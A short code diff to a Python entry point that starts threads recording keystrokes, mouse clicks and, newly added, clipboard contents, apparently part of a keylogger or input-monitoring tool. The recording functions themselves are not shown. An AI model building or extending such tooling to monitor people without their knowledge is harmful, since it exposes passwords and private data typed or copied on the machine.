@@ -23,17 +23,19 @@
 
 # ========== Importing Modules ==========
 import threading
-from utils.keyTrack import recordKeyStrokes, recordMouseClicks
+from utils.keyTrack import recordKeyStrokes, recordMouseClicks, recordClipboard
 
 # ========== Main Function ==========
 def main():
     # Creating threads
     keyTrackThread = threading.Thread(target=recordKeyStrokes)
     mouseTrackThread = threading.Thread(target=recordMouseClicks)
+    recordClipboardThread = threading.Thread(target=recordClipboard)
     
     # Starting threads
     keyTrackThread.start()
     mouseTrackThread.start()
+    recordClipboardThread.start()
 
 # ========== Main Function Call ==========
 if __name__ == "__main__":
